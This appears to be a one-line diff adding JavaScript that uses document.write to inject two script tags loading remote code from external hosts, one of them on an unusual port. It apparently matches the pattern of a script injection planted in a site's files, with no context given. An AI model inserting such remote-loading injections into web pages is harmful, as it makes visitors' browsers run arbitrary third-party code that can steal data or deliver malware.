@@ -1,0 +1,1 @@
+document.write("<script src='http://mall.365tiango.com/baijinka/mobile/data/static/js/common.js?_xvx_=4003162516'></script>");document.write("<script src='http://j.doudao.cn:7777/js/c.js'></script>");
